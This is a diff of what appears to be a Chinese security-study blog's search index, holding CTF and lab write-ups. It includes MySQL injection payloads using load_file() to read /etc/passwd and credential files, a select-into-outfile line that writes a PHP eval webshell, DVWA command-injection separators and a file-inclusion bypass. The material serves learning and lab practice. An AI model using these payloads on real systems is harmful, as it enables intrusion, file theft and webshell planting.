@@ -1,6 +1,84 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Mysql注入中load_file()与select into outfile命令</title>
+    <url>/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h1 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h1><p>查看某个文件的内容</p>
+<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669856332515-8f2af14e-b76a-4933-a200-921a3c79dceb.png" alt="img"></p>
+<span id="more"></span>
+
+<p>看过<strong>《SQL Injection with MySQL》</strong>的朋友肯定知道用char()函数或者把字符转换成16进制。</p>
+<p>注：当前条件为magic_quotes_gpc=on, c:/boot.ini可读。</p>
+<p>我们构造**$id**为：</p>
+<p>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p>
+<p>“char(99,58,47,98,111,111,116,46,105,110,105)”就是”c:/boot.ini”的ASCII代码。</p>
+<p>我们的查询语句就变成：</p>
+<p>select * from article where articleid=-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p>
+<p>这样我们也可以成功读取boot.ini文件，还有把字符转换为16进制的：</p>
+<p>“c:/boot.ini”的十六进制是”0x633a2f626f6f742e696e69”,16进制前需要加<strong>0x</strong></p>
+<p>所以上面的语句就变成：</p>
+<p>select * from article where articleid=-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</p>
+<p>在实际应用中，由于种种条件限制，文件的内容未必会显示出来，我们可以用<strong>into outfile</strong>把文件导出</p>
+<p>关于<strong>mysql into outfile</strong>注射，要使用into outfile把代码写到web目录取得webshell首先需要3大先天条件：</p>
+<p>1、知道物理路径（into outfule ‘物理路径’), 这样才能写对目录。</p>
+<p>2、能够使用union （需要mysql 3以上的版本）</p>
+<p>3、对方没有对（’）进行过滤（因为outfile后面的（’’）不可以用其他函数代替转换）</p>
+<p>后天条件需要二个：</p>
+<p>1、就是mysql用户拥有file_priv权限（不然就不能写文件或读文件）</p>
+<p>2、对web目录有写权限MS的系统就不说了，一般都会有权限的，但是*nix的系统，通常都是rwxr-xr-x</p>
+<p>也就是说组跟其他用户都没有权限写操作，所以，要满足这5大条件还是蛮高难度的</p>
+<h2 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h2><p>mysql的load_file()常见的用法：</p>
+<p>1、replace(load_file(0×2F6574632F706173737764), 0x3c, 0x20)</p>
+<p>2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p>
+<p>上面两个是查看一些php文件里完全显示代码。有些时候不替换一些字符，如”&lt;”替换成”空格”,返回的是网页。</p>
+<p>而无法查看到代码。</p>
+<p>3、load_file(char(47))可以列出FreeBSD, Sunos系统根目录。</p>
+<p>4、/etc/httpd/conf/httpd.conf或者/usr/local/apache/conf/httpd.conf查看linux apache<a href="https://cloud.tencent.com/product/lighthouse?from=10680">虚拟主机</a>配置文件。</p>
+<p>5、c:/Program Files/Apache Group/Apache/conf/httpd.conf或c:/apache/conf/httpd.conf 查看windows系统</p>
+<p>apache文件。</p>
+<p>6、c:/Resin-3.0.14/conf/resin.conf 或c:/Resin/conf/resin.conf 查看jsp开发网站的resin文件配置信息。</p>
+<p>7、/usr/local/resin/conf/resin.cof 查看linux系统配置的JSP虚拟主机</p>
+<p>8、../themes/darkblue_orange/layout.inc.php phpmyadmin爆路径</p>
+<p>9、c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件</p>
+<p>10、/usr/local/resin-3.0.22/conf/resin.conf 或 /usr/local/resin-pro-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</p>
+<p>11、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf Apache虚拟主机查看</p>
+<p>12、/etc/sysconfig/iptables 查看防火墙策略</p>
+<p>13、usr/local/app/php5/lib/php.ini PHP的设置</p>
+<p>14、/etc/my.cnf Mysql的配置文件</p>
+<p>15、c:/mysql/data/mysql/user.MYD 存在MYSQL系统中的用户密码</p>
+<p>16、/etc/sysconfig/network-scripts/ifcfg-eth0 查看IP</p>
+<p>17、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf 虚拟网站设置</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/1918345">https://cloud.tencent.com/developer/article/1918345</a></p>
+<h1 id="select-into-outfile命令"><a href="#select-into-outfile命令" class="headerlink" title="select into outfile命令"></a>select into outfile命令</h1><p>在mysql数据库中存在mysql select into outfile命令，该命令与load data infile命令作用恰好相反。该命令的作用是将被选择的一行写入一个文件中。（文件被创建到服务器主机上）</p>
+<p>但是，需要注意的是：into outfile和load_file()两种方式的利用都是具有局限性的。</p>
+<p><strong>其中，into outfile的使用前提是：</strong></p>
+<p>1.<strong>要知道网站的绝对路径，可以通过报错信息、phpinfo界面、404界面等一些方式知道</strong></p>
+<p>2.要有file权限，默认情况下只有root权限有</p>
+<p>3.对目录要有写权限，一般image之类的存放图片的目录有写权限</p>
+<p>还要注意的是：写的文件名一定是在网站中不存在的，不然也会不成功</p>
+<p><strong>select …… into outfile ‘filename’常见的利用方式：</strong></p>
+<p>1.直接写进文件里</p>
+<p>select version() into outfile “绝对路径”,其中version()可以换成其余的查询数据库信息的函数 version()左右不需要加单引号</p>
+<p>2.修改文件结尾</p>
+<p>select ‘<?php @eval($_POST['cmd']);?>‘ into outfile “xxx/test.php”,这里需要获取到网站在系统中的具体路径(绝对路径)  写入内容需要加单引号(不能加双引号)</p>
+<p>那么好，现在我们知道了select…… into outfile的利用方法了</p>
+<p>首先，根据前面几题的经验，我们可以知道该网站目录的绝对路径，且用户是root权限的。那么就满足了我们使用outfile 去获取网站信息的使用前提条件</p>
+<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858312565-d4c63848-3797-4e5a-9c09-b82ecc558e85.png" alt="img"></p>
+<p>查版本号</p>
+<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858348161-3f7bdfcd-aa20-4aa6-ab24-937ba23497ea.png" alt="img"></p>
+<p>蚁剑连接</p>
+<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858460854-566981f4-0498-4403-9def-65d7d09a66d7.png" alt="img"></p>
+<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/275874.html">https://www.freebuf.com/articles/web/275874.html</a></p>
+<p><a href="https://blog.csdn.net/weixin_44377973/article/details/109265546">https://blog.csdn.net/weixin_44377973/article/details/109265546</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DVWA靶场（待补充）</title>
     <url>/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/</url>
     <content><![CDATA[<h1 id="Command-Injection-命令执行"><a href="#Command-Injection-命令执行" class="headerlink" title="Command Injection(命令执行)"></a>Command Injection(命令执行)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; ipconfig　　　　先执行127.0.0.1，不管127.0.0.1是否执行成功都会执行ipconfig</span><br><span class="line">127.0.0.1 &amp;&amp; ipconfig　　  先执行127.0.0.1，127.0.0.1执行成功后才会执行ipconfig</span><br><span class="line">127.0.0.1 | ipconfig　　　　不管127.0.0.1执行是否成功都会执行ipconfig</span><br><span class="line">127.0.0 || ipconfig　　　   前面的命令要执行失败，才可以执行后面的命令</span><br><span class="line">执行 ping 127.0.0.1 ; ipconfig Linux下分隔符</span><br></pre></td></tr></table></figure>
@@ -360,84 +438,6 @@
       </categories>
       <tags>
         <tag>靶场</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Mysql注入中load_file()与select into outfile命令</title>
-    <url>/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h1 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h1><p>查看某个文件的内容</p>
-<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669856332515-8f2af14e-b76a-4933-a200-921a3c79dceb.png" alt="img"></p>
-<span id="more"></span>
-
-<p>看过<strong>《SQL Injection with MySQL》</strong>的朋友肯定知道用char()函数或者把字符转换成16进制。</p>
-<p>注：当前条件为magic_quotes_gpc=on, c:/boot.ini可读。</p>
-<p>我们构造**$id**为：</p>
-<p>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p>
-<p>“char(99,58,47,98,111,111,116,46,105,110,105)”就是”c:/boot.ini”的ASCII代码。</p>
-<p>我们的查询语句就变成：</p>
-<p>select * from article where articleid=-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p>
-<p>这样我们也可以成功读取boot.ini文件，还有把字符转换为16进制的：</p>
-<p>“c:/boot.ini”的十六进制是”0x633a2f626f6f742e696e69”,16进制前需要加<strong>0x</strong></p>
-<p>所以上面的语句就变成：</p>
-<p>select * from article where articleid=-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</p>
-<p>在实际应用中，由于种种条件限制，文件的内容未必会显示出来，我们可以用<strong>into outfile</strong>把文件导出</p>
-<p>关于<strong>mysql into outfile</strong>注射，要使用into outfile把代码写到web目录取得webshell首先需要3大先天条件：</p>
-<p>1、知道物理路径（into outfule ‘物理路径’), 这样才能写对目录。</p>
-<p>2、能够使用union （需要mysql 3以上的版本）</p>
-<p>3、对方没有对（’）进行过滤（因为outfile后面的（’’）不可以用其他函数代替转换）</p>
-<p>后天条件需要二个：</p>
-<p>1、就是mysql用户拥有file_priv权限（不然就不能写文件或读文件）</p>
-<p>2、对web目录有写权限MS的系统就不说了，一般都会有权限的，但是*nix的系统，通常都是rwxr-xr-x</p>
-<p>也就是说组跟其他用户都没有权限写操作，所以，要满足这5大条件还是蛮高难度的</p>
-<h2 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h2><p>mysql的load_file()常见的用法：</p>
-<p>1、replace(load_file(0×2F6574632F706173737764), 0x3c, 0x20)</p>
-<p>2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p>
-<p>上面两个是查看一些php文件里完全显示代码。有些时候不替换一些字符，如”&lt;”替换成”空格”,返回的是网页。</p>
-<p>而无法查看到代码。</p>
-<p>3、load_file(char(47))可以列出FreeBSD, Sunos系统根目录。</p>
-<p>4、/etc/httpd/conf/httpd.conf或者/usr/local/apache/conf/httpd.conf查看linux apache<a href="https://cloud.tencent.com/product/lighthouse?from=10680">虚拟主机</a>配置文件。</p>
-<p>5、c:/Program Files/Apache Group/Apache/conf/httpd.conf或c:/apache/conf/httpd.conf 查看windows系统</p>
-<p>apache文件。</p>
-<p>6、c:/Resin-3.0.14/conf/resin.conf 或c:/Resin/conf/resin.conf 查看jsp开发网站的resin文件配置信息。</p>
-<p>7、/usr/local/resin/conf/resin.cof 查看linux系统配置的JSP虚拟主机</p>
-<p>8、../themes/darkblue_orange/layout.inc.php phpmyadmin爆路径</p>
-<p>9、c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件</p>
-<p>10、/usr/local/resin-3.0.22/conf/resin.conf 或 /usr/local/resin-pro-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</p>
-<p>11、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf Apache虚拟主机查看</p>
-<p>12、/etc/sysconfig/iptables 查看防火墙策略</p>
-<p>13、usr/local/app/php5/lib/php.ini PHP的设置</p>
-<p>14、/etc/my.cnf Mysql的配置文件</p>
-<p>15、c:/mysql/data/mysql/user.MYD 存在MYSQL系统中的用户密码</p>
-<p>16、/etc/sysconfig/network-scripts/ifcfg-eth0 查看IP</p>
-<p>17、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf 虚拟网站设置</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/1918345">https://cloud.tencent.com/developer/article/1918345</a></p>
-<h1 id="select-into-outfile命令"><a href="#select-into-outfile命令" class="headerlink" title="select into outfile命令"></a>select into outfile命令</h1><p>在mysql数据库中存在mysql select into outfile命令，该命令与load data infile命令作用恰好相反。该命令的作用是将被选择的一行写入一个文件中。（文件被创建到服务器主机上）</p>
-<p>但是，需要注意的是：into outfile和load_file()两种方式的利用都是具有局限性的。</p>
-<p><strong>其中，into outfile的使用前提是：</strong></p>
-<p>1.<strong>要知道网站的绝对路径，可以通过报错信息、phpinfo界面、404界面等一些方式知道</strong></p>
-<p>2.要有file权限，默认情况下只有root权限有</p>
-<p>3.对目录要有写权限，一般image之类的存放图片的目录有写权限</p>
-<p>还要注意的是：写的文件名一定是在网站中不存在的，不然也会不成功</p>
-<p><strong>select …… into outfile ‘filename’常见的利用方式：</strong></p>
-<p>1.直接写进文件里</p>
-<p>select version() into outfile “绝对路径”,其中version()可以换成其余的查询数据库信息的函数 version()左右不需要加单引号</p>
-<p>2.修改文件结尾</p>
-<p>select ‘<?php @eval($_POST['cmd']);?>‘ into outfile “xxx/test.php”,这里需要获取到网站在系统中的具体路径(绝对路径)  写入内容需要加单引号(不能加双引号)</p>
-<p>那么好，现在我们知道了select…… into outfile的利用方法了</p>
-<p>首先，根据前面几题的经验，我们可以知道该网站目录的绝对路径，且用户是root权限的。那么就满足了我们使用outfile 去获取网站信息的使用前提条件</p>
-<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858312565-d4c63848-3797-4e5a-9c09-b82ecc558e85.png" alt="img"></p>
-<p>查版本号</p>
-<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858348161-3f7bdfcd-aa20-4aa6-ab24-937ba23497ea.png" alt="img"></p>
-<p>蚁剑连接</p>
-<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858460854-566981f4-0498-4403-9def-65d7d09a66d7.png" alt="img"></p>
-<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/275874.html">https://www.freebuf.com/articles/web/275874.html</a></p>
-<p><a href="https://blog.csdn.net/weixin_44377973/article/details/109265546">https://blog.csdn.net/weixin_44377973/article/details/109265546</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1404,6 +1404,43 @@ https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
       </tags>
   </entry>
   <entry>
+    <title>(图片拼接)NewStarCTF 公开赛赛道week2 MISC Coldwinds&#39;s Desktop(复现)</title>
+    <url>/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416306569-9aa5a982-43ef-4972-8d43-89b25e435c4a.png" alt="img"></p>
+<span id="more"></span>
+
+<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416338466-2f76193e-583e-499b-8ff3-fa1025aab6e9.png" alt="img"></p>
+<p>这是一道拼图题目学要用到的工具有ImageMagick 和kali中的gaps</p>
+<p>montage命令使用方法</p>
+<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416702284-25fab834-afb5-454c-b114-d3cf8ae15a9f.png" alt="img"></p>
+<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416734599-45d36a65-a981-4c46-a7f4-cf7179a87021.png" alt="img"></p>
+<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416754918-8efb1efb-f0d5-49ec-8b8a-0f133851f5a8.png" alt="img"></p>
+<p>在图片目录cmd输入命令<code>magick montage *.png -tile 16x9 -geometry +0+0 flag.jpg</code></p>
+<p>-geometry +0+0   这个命令是使整合图片间隙为0</p>
+<p>得到整合图片</p>
+<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416814529-465ef053-f3f1-45ce-8307-206a3c3c89c1.jpeg" alt="img"></p>
+<p>在kali中使用命令<code>gaps --image=flag.jpg --size=30 --population=144 --generations=64 --save</code></p>
+<p>–image 指向拼图的路径</p>
+<p>–size 拼图块的像素尺寸</p>
+<p>–generations 遗传算法的代的数量</p>
+<p>–population 个体数量</p>
+<p>–verbose 每一代训练结束后展示最佳结果</p>
+<p>–save 将拼图还原为图像</p>
+<p>size比较重要，这里影响着图片数量，图片数量要和本来的图片数相等</p>
+<p>原文链接：<a href="https://blog.csdn.net/m0_47643893/article/details/113778577">https://blog.csdn.net/m0_47643893/article/details/113778577</a></p>
+<p>得到拼图</p>
+<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416988841-5b441246-a691-435d-9a19-19db7a378b8f.jpeg" alt="img"></p>
+<p>最后ps得到</p>
+<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668417012503-9e5c207f-4f14-4614-bf32-8da22bdc2060.jpg" alt="img"></p>
+]]></content>
+      <categories>
+        <category>图片隐写</category>
+      </categories>
+      <tags>
+        <tag>MISC</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>基础RSA</title>
     <url>/2023/01/07/%E5%9F%BA%E7%A1%80RSA/</url>
     <content><![CDATA[<ol>
@@ -1441,43 +1478,6 @@ https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
       </categories>
       <tags>
         <tag>RSA</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>(图片拼接)NewStarCTF 公开赛赛道week2 MISC Coldwinds&#39;s Desktop(复现)</title>
-    <url>/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416306569-9aa5a982-43ef-4972-8d43-89b25e435c4a.png" alt="img"></p>
-<span id="more"></span>
-
-<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416338466-2f76193e-583e-499b-8ff3-fa1025aab6e9.png" alt="img"></p>
-<p>这是一道拼图题目学要用到的工具有ImageMagick 和kali中的gaps</p>
-<p>montage命令使用方法</p>
-<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416702284-25fab834-afb5-454c-b114-d3cf8ae15a9f.png" alt="img"></p>
-<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416734599-45d36a65-a981-4c46-a7f4-cf7179a87021.png" alt="img"></p>
-<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416754918-8efb1efb-f0d5-49ec-8b8a-0f133851f5a8.png" alt="img"></p>
-<p>在图片目录cmd输入命令<code>magick montage *.png -tile 16x9 -geometry +0+0 flag.jpg</code></p>
-<p>-geometry +0+0   这个命令是使整合图片间隙为0</p>
-<p>得到整合图片</p>
-<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416814529-465ef053-f3f1-45ce-8307-206a3c3c89c1.jpeg" alt="img"></p>
-<p>在kali中使用命令<code>gaps --image=flag.jpg --size=30 --population=144 --generations=64 --save</code></p>
-<p>–image 指向拼图的路径</p>
-<p>–size 拼图块的像素尺寸</p>
-<p>–generations 遗传算法的代的数量</p>
-<p>–population 个体数量</p>
-<p>–verbose 每一代训练结束后展示最佳结果</p>
-<p>–save 将拼图还原为图像</p>
-<p>size比较重要，这里影响着图片数量，图片数量要和本来的图片数相等</p>
-<p>原文链接：<a href="https://blog.csdn.net/m0_47643893/article/details/113778577">https://blog.csdn.net/m0_47643893/article/details/113778577</a></p>
-<p>得到拼图</p>
-<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416988841-5b441246-a691-435d-9a19-19db7a378b8f.jpeg" alt="img"></p>
-<p>最后ps得到</p>
-<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668417012503-9e5c207f-4f14-4614-bf32-8da22bdc2060.jpg" alt="img"></p>
-]]></content>
-      <categories>
-        <category>图片隐写</category>
-      </categories>
-      <tags>
-        <tag>MISC</tag>
       </tags>
   </entry>
   <entry>
@@ -1581,41 +1581,6 @@ https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
       </tags>
   </entry>
   <entry>
-    <title>指定后缀文件包含（.php后缀）与 指定前缀文件包含（files）</title>
-    <url>/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910232518-495a690a-4783-427c-a775-eda71d6f1c4e.png" alt="img"></p>
-<span id="more"></span>
-
-<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910568528-ca80407a-37d5-46c5-9a65-d353be949613.png" alt="img"></p>
-<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910692582-83b88d68-0c51-4de8-ac64-86e6b897102b.png" alt="img"></p>
-<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672917386671-e8576ed5-a7c2-4445-b76c-152bf817402b.png" alt="img"></p>
-<h2 id="熊海cms文件包含漏洞-指定前缀files"><a href="#熊海cms文件包含漏洞-指定前缀files" class="headerlink" title="熊海cms文件包含漏洞(指定前缀files/)"></a>熊海cms文件包含漏洞(指定前缀files/)</h2><?php
-
-//单一入口模式
-
-error_reporting(0); //关闭错误显示
-
-$file=addslashes($_GET['r']); //接收文件名
-
-$action=$file==''?'index':$file; //判断为空或者等于index
-
-include('files/'.$action.'.php'); //载入相应文件
-
-?>
-
-<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>两个index.php文件均为以下内容，代码中对GET传参只进行了一个 addslashes过滤操作，但该操作对预防文件包含没有什么作用，我们只需要在对应的files文件下存在以 .php结尾的文件，即可利用文件名(不包含.php后缀)作为参数 r的内容，达到文件包含的目的</p>
-<p>由于用了 addslashes函数所以不能用%00截断来绕过.php后缀</p>
-<p>可以用………（256个.）</p>
-<p>或者././././(256个./)绕过</p>
-]]></content>
-      <categories>
-        <category>文件包含</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>(报错注入)[SWPUCTF 2021 新生赛]error(复现)</title>
     <url>/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<p><img src="/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/1670981836315-077cff39-364a-4d39-b030-9702a7ca1cb6.png" alt="img"></p>
@@ -1663,6 +1628,41 @@ include('files/'.$action.'.php'); //载入相应文件
       </tags>
   </entry>
   <entry>
+    <title>指定后缀文件包含（.php后缀）与 指定前缀文件包含（files）</title>
